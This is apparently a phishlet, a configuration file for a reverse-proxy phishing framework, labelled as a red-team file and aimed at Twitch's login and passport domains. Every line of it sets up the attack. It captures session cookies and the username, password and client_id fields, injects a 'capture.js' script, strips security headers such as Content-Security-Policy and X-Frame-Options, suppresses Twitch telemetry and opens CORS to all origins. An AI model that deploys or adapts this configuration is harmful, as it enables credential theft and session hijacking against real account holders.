name: "Twitch"
author: "Vanta v5 Red Team"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "www"
    target: "www.twitch.tv"
  - subdomain: "passport"
    target: "passport.twitch.tv"
auth_urls: 
  - "/login"
  - "/signup"
landing_path: ["/login"]
auth_tokens:
  - {type: "cookie", name: "auth-token"}
  - {type: "cookie", name: "persistent"}
  - {type: "cookie", name: "unique_id"}
credentials:
  - {type: "post_param", name: "username", regex: null}
  - {type: "post_param", name: "password", regex: null}
  - {type: "post_param", name: "client_id", regex: null}
injections:
  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "X-XSS-Protection"}
path_rewrites:
  - {pattern: "^/$", replace: "/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "twitch-tracker|/analytics|/telemetry", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*='login']", action_to: "/login"}
bridges:
  - {prefix: "/passport/", target_host: "passport.twitch.tv", strip_prefix: true, cors: "allow_all"}
cors:
  mode: "allow_all"
  methods: ["GET", "POST", "OPTIONS"]
  headers: ["*"]